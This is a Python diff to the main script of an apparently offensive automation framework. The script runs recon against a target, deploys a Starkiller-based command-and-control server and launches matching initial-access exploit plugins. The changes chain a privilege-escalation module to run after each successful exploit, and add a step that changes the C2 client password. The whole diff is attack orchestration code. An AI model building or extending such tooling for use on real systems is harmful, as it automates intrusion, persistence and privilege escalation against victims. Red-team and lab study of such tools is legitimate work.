@@ -4,6 +4,7 @@ import socket
 import argparse
 import c2.c2 as c2
 import configparser
+from core import privesc
 from core.utils import *
 import core.recon as recon
 from pyfiglet import Figlet
@@ -36,7 +37,7 @@ def read_plugins_configs() -> dict:
     return configs
 
 
-def run_initial_access_plugin(plugin_name: str, plugin_config:list, target_ip: str, target_port: int, local_ip: str, local_port: int, compromission_recap_file_name: str, token: str) -> None:
+def run_initial_access_plugin(plugin_name: str, plugin_config: list, target_ip: str, target_port: int, local_ip: str, local_port: int, compromission_recap_file_name: str, container_id: str, token: str) -> None:
     """
     Run an initial access plugin
     """
@@ -48,6 +49,7 @@ def run_initial_access_plugin(plugin_name: str, plugin_config:list, target_ip: s
             print('[+] Exploit was successful !')
             if compromission_recap_file_name:
                 report.write_report(compromission_recap_file_name, plugin_config, target_ip, target_port)
+            privesc.plugins(container_id, token, target_ip)
     except Exception as e:
         print(e)
 
@@ -138,6 +140,8 @@ def main() -> None | str:
     # deploy c2 and start client
     c2_infos = c2.c2(LOCAL_IP)
     c2.get_starkiller()
+    c2.change_client_password(c2_infos[3], c2_infos[2])
+
     
     # Search a compatible exploit and start it
     for target in res_recon:
@@ -150,7 +154,7 @@ def main() -> None | str:
                 or (safe_get(i, 'http_title') and safe_get(values, 'http_title') and safe_get(values, 'http_title') in safe_get(i, 'http_title')):
                     exploit_available = True
                     target_port = i['port']
-                    exploit_process = Process(target=run_initial_access_plugin, args = (plugin_name, values, args.target_ip, target_port, LOCAL_IP, args.local_port, args.output, c2_infos[1]))
+                    exploit_process = Process(target=run_initial_access_plugin, args = (plugin_name, values, args.target_ip, target_port, LOCAL_IP, args.local_port, args.output, c2_infos[0], c2_infos[1]))
                     exploit_process.start()
                     exploit_process.join()
             if not exploit_available:
